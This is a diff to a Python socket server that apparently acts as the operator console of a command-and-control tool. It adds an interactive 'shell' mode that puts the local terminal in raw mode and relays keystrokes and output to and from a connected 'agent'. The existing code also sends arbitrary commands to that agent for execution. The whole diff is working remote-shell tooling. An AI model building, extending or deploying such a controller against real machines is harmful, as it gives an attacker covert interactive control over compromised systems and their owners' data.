@@ -1,6 +1,10 @@
 import socket
 import struct 
 import os 
+import tty
+import termios
+import sys
+import select
 
 HOST = '127.0.0.1'
 PORT = 9001
@@ -92,7 +96,55 @@ def handle_agent(conn, addr):
                 except Exception as e:
                     print(f'Error: {e}')
                 continue
-                           
+            
+            if cmd == "shell":
+                header = struct.pack("!II", 6, 0)
+                conn.sendall(header)
+                print("Running shell, type 'exit' to return")
+                
+                old_settings = termios.tcgetattr(sys.stdin)
+                tty.setraw(sys.stdin.fileno())
+                
+                eof_seq = b"\xff\xff\xff\xff_EOF_"
+                temp_buffer = b""
+                try:
+                    while True:
+                        r, w, x = select.select([conn, sys.stdin], [], [])
+                        
+                        if conn in r:
+                            data = conn.recv(4096)
+                            if not data:
+                                break
+                            
+                            temp_buffer += data
+                            
+                            if eof_seq in temp_buffer:
+                                before_eof = temp_buffer.split(eof_seq)[0]
+                                if before_eof:
+                                    sys.stdout.buffer.write(before_eof)
+                                    sys.stdout.flush()
+                                break
+                            else:
+                                sys.stdout.buffer.write(data)
+                                sys.stdout.flush()
+                                
+                                if len(temp_buffer) > len(eof_seq):
+                                    temp_buffer = temp_buffer[-len(eof_seq):]
+                        
+                        if sys.stdin in r:
+                            user_input = os.read(sys.stdin.fileno(), 4096)
+                            if not user_input:
+                                break
+                            conn.sendall(user_input)
+                except Exception as e:
+                    pass
+                finally:
+                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
+                    print('Session ended')
+                continue
+                    
+                    
+            
             payload = cmd.encode()
             header = struct.pack("!II", 1, len(payload)) # 1 - shell execution
             conn.sendall(header + payload)
